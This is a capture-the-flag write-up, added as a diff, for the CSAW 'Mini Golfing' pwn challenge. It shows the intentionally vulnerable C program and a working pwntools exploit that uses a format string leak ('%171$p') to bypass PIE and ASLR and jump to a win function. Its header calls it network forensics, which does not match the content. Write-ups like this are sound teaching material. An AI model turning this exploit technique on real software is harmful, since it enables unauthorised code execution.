@@ -1,0 +1,89 @@
+---
+title: CSAW CTF - Mini Golfing
+description: A network forensics CTF chall. writeup.
+date: "2024-09-20"
+---
+
+## Let's get cracking...
+
+### Challenge Description:
+
+`Let’s go mini golfing! To win, just aim correctly! Except the hole with the pin keeps moving…`
+
+Following is the main challenge file.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+#define MAX_STRINGS 32
+
+void win() {
+    system("cat /flag.txt");
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+            
+    fflush(stdout);
+    fflush(stdin);
+
+    uintptr_t address;
+    char *all_strings[MAX_STRINGS] = {NULL};
+ char buf[1024] = {'\0'};
+
+    printf("Welcome to PWN GOLF.\n");
+    printf("Would you like to enter your name? ");
+   
+    fgets(buf, 1024, stdin);
+    printf("hello: ");
+ printf(buf);
+   
+    printf("\nAlright! Tell me the address you want to aim at!: ");
+    scanf("%lx", &address);
+    void (*target)(void) = (void(*))address;
+    printf("Ok jumping to that address...");
+    target();
+
+    return 0;
+}
+```
+
+## Challenge Breakdown:
+
+It was a classic PWN challenge where the goal was to exploit a vulnerable program that allowed you to jump to any address you provided. The twist, however, was that both Position Independent Executable (`PIE`) and Address Space Layout Randomization (`ASLR`) were enabled, making it impossible to use static addresses to hijack the control flow. This meant I had to come up with a creative way to bypass the randomized memory layout. Instead of relying on known addresses, I had to leak or brute force information about the memory space to find where the key functions or gadgets were located.
+
+### Solution:
+
+```python
+from pwn import *
+from pwn import p64
+
+binary = ELF("./golf")
+#conn = process(binary.path)
+conn = remote("localhost", 9999)
+
+exploit = "%171$p"
+conn.sendline(exploit)
+leaked_address = conn.recvuntil(b"\n\n").split()
+leaked_address = leaked_address[-1].decode('UTF-8')
+
+leaked_addr_int = int(leaked_address, 16)
+
+win_addr = leaked_addr_int - 26
+win_addr = hex(win_addr)
+
+conn.sendline(win_addr)
+conn.interactive()
+```
+
+This exploit script solves the challenge by leveraging a format string vulnerability to leak the memory address of the `main` function. Since both `PIE` and `ASLR` are enabled, the program's memory layout is randomized, so static addresses cannot be used. The format string payload `%171$p` retrieves the address of the `main` function from the program's stack. Once the address is leaked and parsed, the script calculates the address of the `win` function by subtracting 26 (determined through prior reverse engineering). This offset allows the script to adjust for the randomized memory layout, effectively bypassing `ASLR` and `PIE` protections. The calculated `win` address is then sent, causing the program to jump to and execute the `win` function, thereby achieving code execution and solving the challenge.
+
+**Flag:** `csawctf{I_doNT_want_t0_g0_901FING_AnymOrE_pl34S3_Thank_you_!!!}`
+
+
+
+## MUHAMMAD ABDULLAH
+## THANKS
